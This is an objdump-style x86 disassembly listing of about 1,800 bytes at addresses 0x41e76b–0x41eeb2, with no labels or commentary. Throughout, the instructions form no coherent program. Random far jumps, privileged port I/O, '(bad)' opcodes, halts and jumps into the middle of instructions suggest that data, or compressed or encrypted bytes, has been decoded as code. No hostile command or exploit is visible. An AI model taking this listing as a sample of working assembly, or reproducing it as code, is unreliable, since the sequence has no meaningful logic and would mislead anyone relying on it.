  41e76b:	call   0xb1b8:0x8a46d65b
  41e772:	and    bh,bh
  41e774:	push   ss
  41e775:	push   ebx
  41e776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e777:	imul   ecx,DWORD PTR [ebp-0x4c79c1ae],0xa1ff8dc0
  41e781:	sub    dh,cl
  41e783:	ret    
  41e784:	push   esp
  41e785:	ds dec ebx
  41e787:	xor    DWORD PTR [esi+0x20074d9b],ebp
  41e78d:	cmp    ah,0xbb
  41e790:	rcr    DWORD PTR [ecx+0x3e],cl
  41e793:	mov    WORD PTR [eax-0x12c815c3],cs
  41e799:	sub    al,0x3
  41e79b:	scas   eax,DWORD PTR es:[edi]
  41e79c:	lahf   
  41e79d:	or     edi,esp
  41e79f:	les    esi,FWORD PTR [ebx]
  41e7a1:	xchg   edi,eax
  41e7a2:	sub    al,0x86
  41e7a4:	inc    esi
  41e7a5:	in     eax,dx
  41e7a6:	jbe    0x41e7a3
  41e7a8:	dec    BYTE PTR [ebp+0x69]
  41e7ab:	out    dx,eax
  41e7ac:	xchg   ebp,eax
  41e7ad:	mov    ds:0x35c6c9da,al
  41e7b2:	and    ch,BYTE PTR [ebp+0x2cfefbdc]
  41e7b8:	test   esp,edx
  41e7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7bb:	mov    al,0xb4
  41e7bd:	and    al,0x81
  41e7bf:	out    dx,al
  41e7c0:	cmp    al,0x6
  41e7c2:	xchg   DWORD PTR [ecx*8-0x52f44640],ebp
  41e7c9:	xchg   ecx,eax
  41e7ca:	test   BYTE PTR [edi],bl
  41e7cc:	add    al,0x8e
  41e7ce:	mov    ah,0xd0
  41e7d0:	jae    0x41e776
  41e7d2:	sub    ah,BYTE PTR [ebx]
  41e7d4:	push   ebx
  41e7d5:	and    eax,0x49a6d257
  41e7da:	sub    edx,DWORD PTR [edx-0x7888d4d1]
  41e7e0:	pop    es
  41e7e1:	ss fsubr st(7),st
  41e7e4:	ror    BYTE PTR [ebx+0x34],1
  41e7e7:	cmp    BYTE PTR [edi+0x43],cl
  41e7ea:	imul   ebx,DWORD PTR [ecx-0x2d],0xe9c4ea17
  41e7f1:	in     al,dx
  41e7f2:	mov    dh,0x2b
  41e7f4:	push   ecx
  41e7f5:	push   cs
  41e7f6:	shr    al,1
  41e7f8:	scas   eax,DWORD PTR es:[edi]
  41e7f9:	push   0x2804063b
  41e7fe:	in     al,0x5f
  41e800:	inc    edx
  41e801:	sbb    al,BYTE PTR [edi+0x35]
  41e804:	jnp    0x41e790
  41e806:	jb     0x41e800
  41e808:	fsub   DWORD PTR [ebx]
  41e80a:	adc    eax,0xf761f6e9
  41e80f:	std    
  41e810:	push   esi
  41e811:	lds    ebx,FWORD PTR [ebp-0x400de089]
  41e817:	adc    DWORD PTR [ebx],eax
  41e819:	lods   al,BYTE PTR ds:[esi]
  41e81a:	aas    
  41e81b:	rcr    DWORD PTR [edi+ebp*2+0x5dd3204d],cl
  41e822:	sub    eax,0x282ee343
  41e827:	imul   BYTE PTR ds:0xfac458da
  41e82d:	test   eax,0x90232c0f
  41e832:	mov    ebp,0x1a58924a
  41e837:	jbe    0x41e7c2
  41e839:	out    0xbd,al
  41e83b:	das    
  41e83c:	das    
  41e83d:	dec    ebx
  41e83e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83f:	pop    edi
  41e840:	mov    eax,0xef9aadc4
  41e845:	pop    ebx
  41e846:	ss jmp 0xd2a0f8b6
  41e84c:	sub    BYTE PTR [edi+0x2be18d79],cl
  41e852:	out    0x6b,eax
  41e854:	jo     0x41e8c1
  41e856:	stos   DWORD PTR es:[edi],eax
  41e857:	inc    ebp
  41e858:	fdiv   st(4),st
  41e85a:	mov    dl,0x2b
  41e85c:	pop    edx
  41e85d:	cwde   
  41e85e:	scas   eax,DWORD PTR es:[edi]
  41e85f:	dec    ebp
  41e860:	jno    0x41e869
  41e862:	mov    ds:0xf6dfda82,al
  41e867:	sar    DWORD PTR [ebp-0x577eb278],cl
  41e86d:	add    BYTE PTR [edi],al
  41e86f:	push   edx
  41e870:	jns    0x41e83a
  41e872:	jmp    0xf31:0xdc9fbda8
  41e879:	rcr    ecx,1
  41e87b:	jmp    0xb89:0xdc52835b
  41e882:	xor    ebx,ebx
  41e884:	xchg   ecx,eax
  41e885:	jmp    0x41e899
  41e887:	pop    edx
  41e888:	lahf   
  41e889:	sbb    al,0xb5
  41e88b:	sub    ecx,ecx
  41e88d:	cmp    cl,0xb7
  41e890:	pop    ss
  41e891:	mov    ebx,DWORD PTR [edi+0x71]
  41e894:	mov    ds:0x2ed5d200,eax
  41e899:	push   ss
  41e89a:	pop    ebx
  41e89b:	jns    0x41e8f7
  41e89d:	push   eax
  41e89e:	scas   al,BYTE PTR es:[edi]
  41e89f:	xor    ebp,DWORD PTR [ebx]
  41e8a1:	mov    ds:0x5d337095,al
  41e8a6:	sub    al,0x86
  41e8a8:	ss mov eax,0x2a545083
  41e8ae:	loopne 0x41e8dc
  41e8b0:	cld    
  41e8b1:	cmp    eax,0x6b3ae4c
  41e8b6:	ss test eax,0xfa042f94
  41e8bc:	dec    edi
  41e8bd:	ds dec edx
  41e8bf:	fistp  QWORD PTR [eax+0x653859ad]
  41e8c5:	xor    BYTE PTR [ecx+0x17c35d93],bl
  41e8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8cc:	mov    ds:0x8afcc273,al
  41e8d1:	jne    0x41e91f
  41e8d3:	push   0x3fc03155
  41e8d8:	iret   
  41e8d9:	mul    DWORD PTR [edx]
  41e8db:	jae    0x41e918
  41e8dd:	cmp    ah,BYTE PTR [ebx+0x3d]
  41e8e0:	mov    ch,0x74
  41e8e2:	and    edx,eax
  41e8e4:	mov    dh,0x11
  41e8e6:	xor    DWORD PTR [edx],edx
  41e8e8:	mov    ?,WORD PTR [ebp-0x343ba517]
  41e8ee:	xor    BYTE PTR [eax-0x13a23e62],cl
  41e8f4:	icebp  
  41e8f5:	xchg   edi,eax
  41e8f6:	in     al,dx
  41e8f7:	clc    
  41e8f8:	xchg   DWORD PTR cs:[edx+0x57],ecx
  41e8fc:	sub    BYTE PTR [ebp-0x507e8945],bl
  41e902:	and    ah,al
  41e904:	or     ebp,DWORD PTR [ebp+0x3bd527dc]
  41e90a:	pop    ebp
  41e90b:	outs   dx,DWORD PTR ds:[esi]
  41e90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e90d:	fwait
  41e90e:	xchg   esi,eax
  41e90f:	jmp    0x41e89d
  41e911:	fcom   QWORD PTR [eax+0x24]
  41e914:	xchg   ebp,eax
  41e915:	stos   BYTE PTR es:[edi],al
  41e916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e917:	(bad)  
  41e918:	les    edi,FWORD PTR [eax]
  41e91a:	cmp    edi,DWORD PTR [ebx]
  41e91c:	cmovg  esp,DWORD PTR [esp+ecx*2+0x77]
  41e921:	dec    edi
  41e922:	push   ss
  41e923:	cld    
  41e924:	or     DWORD PTR [esi-0x5ef7b6c2],ecx
  41e92a:	dec    ebx
  41e92b:	hlt    
  41e92c:	imul   ecx,DWORD PTR [edx+0x751cc257],0x44a8ed08
  41e936:	jg     0x41e9ae
  41e938:	sbb    BYTE PTR [eax-0x1f],dl
  41e93b:	xor    eax,DWORD PTR [ecx+0x1b44f28e]
  41e941:	fstp   DWORD PTR [ebx]
  41e943:	lock sbb DWORD PTR [edx+0x2b],ebp
  41e947:	call   0xadc9c51c
  41e94c:	push   0x56
  41e94e:	call   0x8f1dd52
  41e953:	sbb    BYTE PTR [edx+0x22ce0a89],ch
  41e959:	loope  0x41e977
  41e95b:	and    al,0x36
  41e95d:	ficom  WORD PTR [eax]
  41e95f:	and    esp,DWORD PTR [eax]
  41e961:	dec    ebx
  41e962:	fcom   st(1)
  41e964:	jge    0x41e91b
  41e966:	lods   al,BYTE PTR ds:[esi]
  41e967:	mov    WORD PTR [edi],?
  41e969:	add    DWORD PTR [eax+0xd39c22d],0x3d933af2
  41e973:	xabort 0x4c
  41e976:	mov    dh,0xdd
  41e978:	jmp    0x41e9dd
  41e97a:	push   ecx
  41e97b:	sbb    al,BYTE PTR [esi+0x51]
  41e97e:	in     eax,dx
  41e97f:	jns    0x41e9d8
  41e981:	dec    ebp
  41e982:	retf   0xa0ad
  41e985:	in     al,0xdd
  41e987:	pop    esp
  41e988:	push   edi
  41e989:	(bad)  
  41e98a:	icebp  
  41e98b:	lea    eax,[edx+0x42]
  41e98e:	jp     0x41e911
  41e990:	pop    ebp
  41e991:	fsubr  DWORD PTR [esi+0x52]
  41e994:	push   ebx
  41e995:	xor    BYTE PTR [edi+0x1254b0bd],0xd1
  41e99c:	add    ch,al
  41e99e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e99f:	cmp    BYTE PTR [esi],ah
  41e9a1:	jns    0x41e9ed
  41e9a3:	add    ah,BYTE PTR [esi]
  41e9a5:	pop    ecx
  41e9a6:	add    BYTE PTR [ebx+0x4a],ch
  41e9a9:	stos   BYTE PTR es:[edi],al
  41e9aa:	lea    edi,[eax]
  41e9ac:	nop
  41e9ad:	pop    edx
  41e9ae:	push   edx
  41e9af:	mov    bh,0xf6
  41e9b1:	retf   0x90ec
  41e9b4:	push   eax
  41e9b5:	xor    eax,0x92b818df
  41e9ba:	dec    ebp
  41e9bb:	jl     0x41e9eb
  41e9bd:	jbe    0x41e9c1
  41e9bf:	mov    ds:0x6e7eec2c,al
  41e9c4:	fsubr  st,st(6)
  41e9c6:	(bad)  
  41e9c7:	div    BYTE PTR [edx-0x5b]
  41e9ca:	call   0x9a8d:0x7c2ee60
  41e9d1:	rcl    DWORD PTR [ecx+0x12],1
  41e9d4:	xor    eax,DWORD PTR [ecx+edi*2+0x4b34f5bf]
  41e9db:	cmp    al,0xab
  41e9dd:	adc    BYTE PTR [ebp-0x768dd79a],ah
  41e9e3:	mov    BYTE PTR [eax+0x1c8435ed],bl
  41e9e9:	imul   edx,DWORD PTR [ecx],0x84b0fd95
  41e9ef:	or     DWORD PTR ds:0xdae6eecf,ebp
  41e9f5:	push   esi
  41e9f6:	mov    ch,0x15
  41e9f8:	mov    ebx,0x34b273ed
  41e9fd:	popf   
  41e9fe:	lds    ecx,FWORD PTR [ebp+ebp*1-0x53]
  41ea02:	test   al,0xcc
  41ea04:	sbb    al,0xfc
  41ea06:	jnp    0x41e995
  41ea08:	and    esp,ecx
  41ea0a:	inc    eax
  41ea0b:	push   esi
  41ea0c:	lea    esi,[eax+ebx*1-0xd396e8a]
  41ea13:	rcl    BYTE PTR [ebp-0x680b3fe4],cl
  41ea19:	cmp    DWORD PTR [eax],esp
  41ea1b:	ror    DWORD PTR [ebp-0x6ef842ba],1
  41ea21:	cdq    
  41ea22:	push   ecx
  41ea23:	sbb    DWORD PTR [eax],ecx
  41ea25:	in     eax,0x97
  41ea27:	das    
  41ea28:	out    0xdf,al
  41ea2a:	fsubr  DWORD PTR [edi+0x745131a9]
  41ea30:	or     eax,0xd627b400
  41ea35:	outs   dx,BYTE PTR ds:[esi]
  41ea36:	mov    dh,0xaf
  41ea38:	in     eax,0x32
  41ea3a:	arpl   WORD PTR [esi],sp
  41ea3c:	push   ds
  41ea3d:	jl     0x41ea26
  41ea3f:	jmp    0xd5aa:0x76809e66
  41ea46:	dec    esi
  41ea47:	xlat   BYTE PTR ds:[ebx]
  41ea48:	jmp    0x2b43:0xca9144e
  41ea4f:	fmul   DWORD PTR [edx-0x26d4eae]
  41ea55:	add    cl,BYTE PTR [edi-0x7fb0ba48]
  41ea5b:	addr16 retf 0x1640
  41ea5f:	pop    esp
  41ea60:	mov    ch,0x53
  41ea62:	rep ins BYTE PTR es:[edi],dx
  41ea64:	dec    esp
  41ea65:	outs   dx,BYTE PTR ds:[esi]
  41ea66:	sbb    BYTE PTR [ebx-0x3e],dl
  41ea69:	xchg   BYTE PTR [edi],bh
  41ea6b:	sub    ah,BYTE PTR [ebx-0x5e95ce9]
  41ea71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea72:	(bad)  
  41ea73:	cli    
  41ea74:	cmp    esi,edi
  41ea76:	clc    
  41ea77:	iret   
  41ea78:	pop    ss
  41ea79:	xchg   edx,eax
  41ea7a:	jmp    0x2654bf5
  41ea7f:	or     BYTE PTR [ebp-0x75],dh
  41ea82:	jns    0x41ead4
  41ea84:	mov    al,ss:0x5300f1ca
  41ea8a:	mov    esi,0x6e16dbe6
  41ea8f:	mov    DWORD PTR [edx],esp
  41ea91:	xchg   edx,eax
  41ea92:	in     eax,0xe3
  41ea94:	mov    esp,0xf514dc03
  41ea99:	mov    ebp,0xb81f95
  41ea9e:	or     DWORD PTR ds:0x9f2e70c8,eax
  41eaa4:	call   0xf88f:0x8797030
  41eaab:	je     0x41eaa5
  41eaad:	fidivr WORD PTR [ebx]
  41eaaf:	xchg   esp,eax
  41eab0:	outs   dx,BYTE PTR ds:[esi]
  41eab1:	dec    edi
  41eab2:	daa    
  41eab3:	xlat   BYTE PTR ss:[ebx]
  41eab5:	inc    esi
  41eab6:	lods   al,BYTE PTR ds:[esi]
  41eab7:	mov    al,0xd7
  41eab9:	lods   al,BYTE PTR ds:[esi]
  41eaba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eabb:	jle    0x41eab9
  41eabd:	jmp    0x4a53:0x383a734a
  41eac4:	push   edi
  41eac5:	dec    edi
  41eac6:	ins    BYTE PTR es:[edi],dx
  41eac7:	jecxz  0x41eaff
  41eac9:	adc    al,0x2e
  41eacb:	push   ebx
  41eacc:	out    0x0,al
  41eace:	jmp    0x41eae2
  41ead0:	pushf  
  41ead1:	push   DWORD PTR [eax]
  41ead3:	popa   
  41ead4:	ins    DWORD PTR es:[edi],dx
  41ead5:	mov    ebp,DWORD PTR [esi-0x38]
  41ead8:	add    al,BYTE PTR [ebx-0x3df3952b]
  41eade:	push   cs
  41eadf:	je     0x477cfe4f
  41eae5:	xchg   edi,eax
  41eae6:	xchg   DWORD PTR [esi+0x12ce9024],edi
  41eaec:	add    dl,BYTE PTR [edi+0x92d6b14]
  41eaf2:	in     eax,dx
  41eaf3:	and    al,0xef
  41eaf5:	sbb    ebp,ecx
  41eaf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaf8:	xor    DWORD PTR [ebx],ecx
  41eafa:	outs   dx,DWORD PTR ds:[esi]
  41eafb:	cs xor al,0x7
  41eafe:	or     eax,0x939aa26a
  41eb03:	sub    BYTE PTR [edi-0x37],bl
  41eb06:	mov    DWORD PTR [edi-0x4e],edi
  41eb09:	mov    esp,0xeb790cf0
  41eb0e:	sbb    ebp,ebx
  41eb10:	mov    DWORD PTR gs:[edi-0x52b1eff0],ecx
  41eb17:	push   eax
  41eb18:	ins    BYTE PTR es:[edi],dx
  41eb19:	jmp    0xc6ee:0xb2bab406
  41eb20:	sub    eax,0x9f497408
  41eb25:	fwait
  41eb26:	bound  esi,QWORD PTR [edx+0x28]
  41eb29:	int    0x42
  41eb2b:	out    0x65,eax
  41eb2d:	fs push esi
  41eb2f:	xchg   ebp,eax
  41eb30:	sub    al,0x3d
  41eb32:	push   ebx
  41eb33:	or     dh,al
  41eb35:	fst    QWORD PTR [ebp-0x2a]
  41eb38:	add    al,0xdd
  41eb3a:	fnstcw WORD PTR [esi-0x63ba308e]
  41eb40:	mov    ds:0x7d898ba6,al
  41eb45:	xchg   edi,eax
  41eb46:	adc    esp,esp
  41eb48:	jecxz  0x41eb52
  41eb4a:	push   0x3d91e67b
  41eb4f:	lods   al,BYTE PTR ds:[esi]
  41eb50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb51:	mov    gs,WORD PTR [esi+eiz*8-0x45]
  41eb55:	aam    0xb8
  41eb57:	add    DWORD PTR [esi-0x20],edi
  41eb5a:	das    
  41eb5b:	stc    
  41eb5c:	in     eax,0x9b
  41eb5e:	out    dx,eax
  41eb5f:	pop    es
  41eb60:	mov    al,0xb3
  41eb62:	shr    DWORD PTR [esi],cl
  41eb64:	and    DWORD PTR [edx+0x398282c7],edi
  41eb6a:	sbb    ebp,ebp
  41eb6c:	mov    bh,0x52
  41eb6e:	fdiv   st,st(5)
  41eb70:	push   0xffffffeb
  41eb72:	loop   0x41eb70
  41eb74:	shl    ebx,cl
  41eb76:	imul   DWORD PTR [edi]
  41eb78:	push   es
  41eb79:	lods   al,BYTE PTR ds:[esi]
  41eb7a:	je     0x41eb78
  41eb7c:	mov    edi,0x3e206ebb
  41eb81:	repnz das 
  41eb83:	fisub  WORD PTR [edi+0x41]
  41eb86:	popf   
  41eb87:	or     cl,ah
  41eb89:	icebp  
  41eb8a:	xchg   esi,eax
  41eb8b:	sbb    BYTE PTR [esi+0x63],dl
  41eb8e:	mov    edi,0x51c5b13f
  41eb93:	inc    DWORD PTR [edx-0x6b89e33e]
  41eb99:	(bad)  
  41eb9a:	lock sub eax,0x821db1f0
  41eba0:	lea    edi,[eax-0x258e4b77]
  41eba6:	loopne 0x41ebcc
  41eba8:	xor    esp,DWORD PTR [eax+0x20f47d43]
  41ebae:	dec    ebp
  41ebaf:	dec    edi
  41ebb0:	js     0x41eb3f
  41ebb2:	pop    esi
  41ebb3:	sti    
  41ebb4:	sub    BYTE PTR [eax+0x71],ah
  41ebb7:	jbe    0x41ec09
  41ebb9:	ds mov ebp,0x99715041
  41ebbf:	xlat   BYTE PTR ds:[ebx]
  41ebc0:	test   BYTE PTR [eax-0x7dad38df],ch
  41ebc6:	xchg   esi,eax
  41ebc7:	add    BYTE PTR [eax-0x53],bl
  41ebca:	mov    cl,0xb
  41ebcc:	es stos DWORD PTR es:[edi],eax
  41ebce:	inc    eax
  41ebcf:	sbb    bh,BYTE PTR [ecx]
  41ebd1:	jmp    0x939036eb
  41ebd6:	pop    ebx
  41ebd7:	and    BYTE PTR [esp+ebx*2],cl
  41ebda:	cmc    
  41ebdb:	inc    ebx
  41ebdc:	dec    ebp
  41ebdd:	sub    ebp,edx
  41ebdf:	mov    al,ds:0x79b683e2
  41ebe4:	mov    ebx,0xb513934d
  41ebe9:	fwait
  41ebea:	adc    dl,BYTE PTR [eax-0x27]
  41ebed:	popf   
  41ebee:	call   0xae3b:0xc373bd5d
  41ebf5:	pop    ebp
  41ebf6:	push   ebp
  41ebf7:	xlat   BYTE PTR ds:[ebx]
  41ebf8:	inc    ecx
  41ebf9:	xchg   ecx,eax
  41ebfa:	sbb    ah,al
  41ebfc:	xchg   edi,eax
  41ebfd:	push   0xf8c62a4a
  41ec02:	sbb    eax,0xe326b166
  41ec07:	bound  esi,QWORD PTR ds:0xb79f29be
  41ec0d:	test   eax,0xa29c25ab
  41ec12:	push   ebx
  41ec13:	ret    0xb394
  41ec16:	fs in  eax,0x9b
  41ec19:	cdq    
  41ec1a:	loopne 0x41ec53
  41ec1c:	mov    ds:0x99f1cb44,eax
  41ec21:	hlt    
  41ec22:	xchg   edi,eax
  41ec23:	adc    ah,BYTE PTR [edi-0x4b]
  41ec26:	pop    edx
  41ec27:	sar    DWORD PTR ds:0x588efb7c,1
  41ec2d:	ficom  WORD PTR [esi]
  41ec2f:	test   al,0xc4
  41ec31:	das    
  41ec32:	mov    ds:0x45488212,al
  41ec37:	dec    esi
  41ec38:	fadd   QWORD PTR [ebx]
  41ec3a:	or     eax,0x529ade43
  41ec3f:	rcr    DWORD PTR [ebx+ebp*4-0x23],cl
  41ec43:	out    dx,eax
  41ec44:	cmp    al,0x9a
  41ec46:	or     BYTE PTR ds:0xa2d43292,dl
  41ec4c:	cs jae 0x41ec26
  41ec4f:	push   cs
  41ec50:	sub    BYTE PTR [ebx-0x659335f6],bh
  41ec56:	(bad)  
  41ec58:	xchg   BYTE PTR [ebp+0x76],dl
  41ec5b:	sub    DWORD PTR [esp+eiz*4],edx
  41ec5e:	jno    0x41ec34
  41ec60:	push   edx
  41ec61:	jae    0x41ec1a
  41ec63:	xchg   ecx,eax
  41ec64:	shl    BYTE PTR [edi+0x7c],1
  41ec67:	ret    
  41ec68:	out    0x78,al
  41ec6a:	jmp    FWORD PTR [eax+0x56]
  41ec6d:	jecxz  0x41eca3
  41ec6f:	jle    0x41ec91
  41ec71:	into   
  41ec72:	mov    bl,0xe4
  41ec74:	lds    edi,FWORD PTR [edi-0x11d714e7]
  41ec7a:	xchg   ebp,eax
  41ec7b:	lock (bad) 
  41ec7e:	xchg   ecx,eax
  41ec7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec80:	lahf   
  41ec81:	and    cl,dh
  41ec83:	dec    edx
  41ec84:	push   edi
  41ec85:	dec    edx
  41ec86:	scas   al,BYTE PTR es:[edi]
  41ec87:	mov    eax,ds:0xc746d65b
  41ec8c:	mov    al,0xf0
  41ec8e:	pop    esi
  41ec8f:	pop    ebp
  41ec90:	mov    ebp,0xdfc0fcf2
  41ec95:	mov    ds:0x673eec04,al
  41ec9a:	jbe    0x41ec80
  41ec9c:	adc    cl,dh
  41ec9e:	adc    bl,BYTE PTR [ecx-0x1f]
  41eca1:	mov    bh,0xd3
  41eca3:	jo     0x41ecc3
  41eca5:	mov    dl,0x5e
  41eca7:	outs   dx,BYTE PTR ds:[esi]
  41eca8:	shl    esp,1
  41ecaa:	or     dh,al
  41ecac:	sub    eax,eax
  41ecae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecaf:	mov    bl,0xea
  41ecb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecb2:	xor    dh,0x0
  41ecb5:	aam    0x18
  41ecb7:	loop   0x41ece6
  41ecb9:	dec    ecx
  41ecba:	int3   
  41ecbb:	push   esp
  41ecbc:	call   0x49c5:0x3bbb3701
  41ecc3:	sbb    DWORD PTR [edi-0x5a04d747],edi
  41ecc9:	das    
  41ecca:	sbb    BYTE PTR [esi-0x751f41b5],cl
  41ecd0:	dec    ecx
  41ecd1:	(bad)  
  41ecd3:	imul   ebx,DWORD PTR [ecx+0x39],0xb34b9033
  41ecda:	adc    ecx,ebp
  41ecdc:	jl     0x41eca6
  41ecde:	loop   0x41ec78
  41ece0:	xor    esi,DWORD PTR [ebx-0x3fb00e17]
  41ece6:	jp     0x41ece3
  41ece8:	retf   
  41ece9:	loop   0x41ecbf
  41eceb:	test   BYTE PTR [esi+ebp*2+0xd],0x1d
  41ecf0:	dec    edx
  41ecf1:	retf   0xdbb8
  41ecf4:	mov    DWORD PTR cs:[ebp+0x5cd56952],0x1c61d07
  41ecff:	jno    0x41ed64
  41ed01:	jp     0x41ed7c
  41ed03:	nop
  41ed04:	xor    BYTE PTR [ebx+0x550d66d3],dl
  41ed0a:	adc    ecx,DWORD PTR [edx+0x1dc03628]
  41ed10:	add    BYTE PTR [ebp-0x6],dl
  41ed13:	or     edi,ecx
  41ed15:	ins    DWORD PTR es:[edi],dx
  41ed16:	pop    esp
  41ed17:	ret    
  41ed18:	ins    DWORD PTR es:[edi],dx
  41ed19:	mov    fs,WORD PTR [ecx-0x17]
  41ed1c:	clc    
  41ed1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed1e:	inc    ebp
  41ed1f:	mov    esi,0x307d237b
  41ed24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed25:	inc    edi
  41ed26:	lods   al,BYTE PTR ds:[esi]
  41ed27:	inc    edi
  41ed28:	std    
  41ed29:	pop    ds
  41ed2a:	shr    BYTE PTR [edx-0x3959fcf4],1
  41ed30:	adc    DWORD PTR [eax+0x1e],edx
  41ed33:	lods   al,BYTE PTR ds:[esi]
  41ed34:	adc    esi,DWORD PTR [ebp-0x819e828]
  41ed3a:	cmp    al,0xdd
  41ed3c:	addr16 jno 0x41ed4a
  41ed3f:	sub    bl,BYTE PTR [ebx+edx*8-0x15cadd76]
  41ed46:	lds    esi,FWORD PTR [eax-0x4871a9c7]
  41ed4c:	inc    edi
  41ed4d:	xor    al,bl
  41ed4f:	repz fs imul edx,ecx,0xe30268f7
  41ed57:	ds test eax,0xae80aecb
  41ed5d:	std    
  41ed5e:	and    eax,0x11be7390
  41ed63:	pop    esp
  41ed64:	dec    eax
  41ed65:	pop    eax
  41ed66:	mov    ebx,0x5d6f0c4b
  41ed6b:	lea    esp,[ecx-0x7c07e860]
  41ed71:	clc    
  41ed72:	fidivr DWORD PTR [eax+esi*2+0x1c3f07a6]
  41ed79:	fs inc edi
  41ed7b:	jbe    0x41ed60
  41ed7d:	jmp    0x6126b79f
  41ed82:	cwde   
  41ed83:	das    
  41ed84:	(bad)  
  41ed85:	in     al,dx
  41ed86:	mov    bh,0x41
  41ed88:	push   edi
  41ed89:	pop    ds
  41ed8a:	je     0x41edaf
  41ed8c:	adc    BYTE PTR [eax-0x239df5ab],ah
  41ed92:	or     dl,cl
  41ed94:	sub    eax,DWORD PTR ds:0xb20b7cc0
  41ed9a:	push   eax
  41ed9b:	xor    al,0xb8
  41ed9d:	cdq    
  41ed9e:	enter  0xcdf0,0xd4
  41eda2:	pusha  
  41eda3:	pop    ebx
  41eda4:	ins    DWORD PTR es:[edi],dx
  41eda5:	and    eax,0x7c9ae4ff
  41edaa:	xor    DWORD PTR [ebp-0x7d],ebp
  41edad:	mov    esp,0x24e23676
  41edb2:	fisttp DWORD PTR [edi]
  41edb4:	cmp    dh,BYTE PTR [esi+eiz*8+0x2b]
  41edb8:	mov    ch,0xdd
  41edba:	inc    edi
  41edbb:	imul   edi,DWORD PTR [ecx+0x6a3e97c7],0x1d7b570d
  41edc5:	retf   
  41edc6:	or     eax,0xb4e66d19
  41edcb:	jae    0x41ed9f
  41edcd:	mov    ebx,0x56a65d2e
  41edd2:	test   eax,0x53e6d4d
  41edd7:	xor    BYTE PTR [esi],dh
  41edd9:	ja     0x41ed84
  41eddb:	inc    esi
  41eddc:	and    al,0xcb
  41edde:	pop    ebx
  41eddf:	(bad)  
  41ede0:	rol    DWORD PTR [esi+0x65425b61],cl
  41ede6:	test   DWORD PTR [ecx],esp
  41ede8:	sti    
  41ede9:	jo     0x41ee1b
  41edeb:	jl     0x41ed8a
  41eded:	fbstp  TBYTE PTR [edi+0x6b]
  41edf0:	jns    0x41ee1c
  41edf2:	daa    
  41edf3:	ins    BYTE PTR es:[edi],dx
  41edf4:	loope  0x41ee37
  41edf6:	push   es
  41edf7:	bswap  ebp
  41edf9:	dec    eax
  41edfa:	ja     0x41ed82
  41edfc:	cmp    eax,0x3c32b7fb
  41ee01:	inc    eax
  41ee02:	adc    BYTE PTR [ebx],dh
  41ee04:	fcom   QWORD PTR [esi]
  41ee06:	or     DWORD PTR [eax+0x299b57d6],ebx
  41ee0c:	adc    al,0x2f
  41ee0e:	pop    ebx
  41ee0f:	out    0xa0,eax
  41ee11:	(bad)  
  41ee12:	(bad)
  41ee16:	(bad)  
  41ee17:	in     al,0xc9
  41ee19:	fnsave [esp+ebp*1-0x6e]
  41ee1d:	adc    DWORD PTR [ecx],esp
  41ee1f:	sub    edx,DWORD PTR [ebp+0x7c]
  41ee22:	cdq    
  41ee23:	fwait
  41ee24:	sbb    ebx,ebx
  41ee26:	ins    BYTE PTR es:[edi],dx
  41ee27:	inc    ebx
  41ee28:	sbb    DWORD PTR [esi+0x27e949cf],esp
  41ee2e:	xchg   BYTE PTR [esi+0x15906c32],bl
  41ee34:	xlat   BYTE PTR ds:[ebx]
  41ee35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee36:	and    dl,ah
  41ee38:	dec    edx
  41ee39:	in     eax,dx
  41ee3a:	xchg   BYTE PTR [esi+eax*4+0x3f3a564b],dh
  41ee41:	pop    edi
  41ee42:	mov    dh,0xaf
  41ee44:	(bad)  
  41ee45:	ret    0x1a3f
  41ee48:	gs je  0x41eeab
  41ee4b:	adc    DWORD PTR [edi+ebx*1+0x70],ecx
  41ee4f:	jno    0x41eec9
  41ee51:	out    dx,al
  41ee52:	jge    0x41eeb6
  41ee54:	jae    0x41ee8d
  41ee56:	outs   dx,DWORD PTR ds:[esi]
  41ee57:	mov    ebx,0xcf869043
  41ee5c:	or     DWORD PTR [edx+0xed7c089],esp
  41ee62:	repz clc 
  41ee64:	sub    al,0xd0
  41ee66:	mov    dl,BYTE PTR [edi+0x4c15eb9f]
  41ee6c:	bound  ebx,QWORD PTR [eax-0x15]
  41ee6f:	jne    0x41ee18
  41ee71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee72:	js     0x41eedb
  41ee74:	pop    ebp
  41ee75:	jp     0x41ee81
  41ee77:	lods   al,BYTE PTR ds:[esi]
  41ee78:	xchg   esi,eax
  41ee79:	mov    esp,0x87f0babc
  41ee7e:	test   ebx,ecx
  41ee80:	imul   ebp,ebp,0x5ddaa8a3
  41ee86:	imul   ecx,DWORD PTR [ebp+0x37],0x7f
  41ee8a:	outs   dx,DWORD PTR ds:[esi]
  41ee8b:	or     DWORD PTR [ecx],ecx
  41ee8d:	mov    fs,WORD PTR ds:0x25890bd6
  41ee93:	sar    BYTE PTR [eax+0x77],1
  41ee96:	push   esi
  41ee98:	sbb    cl,BYTE PTR [ebp-0x41]
  41ee9b:	iret   
  41ee9c:	fsubr  QWORD PTR [esi-0x6c]
  41ee9f:	pop    es
  41eea0:	leave  
  41eea1:	xlat   BYTE PTR ds:[ebx]
  41eea2:	and    dh,BYTE PTR [eax-0x77]
  41eea5:	les    eax,FWORD PTR fs:[ebp-0x44e8f2bd]
  41eeac:	inc    edi
  41eead:	xchg   ecx,eax
  41eeae:	inc    ecx
  41eeaf:	push   es
  41eeb0:	pop    edx
  41eeb1:	ins    DWORD PTR es:[edi],dx
  41eeb2:	ss jp  0x41ee4b
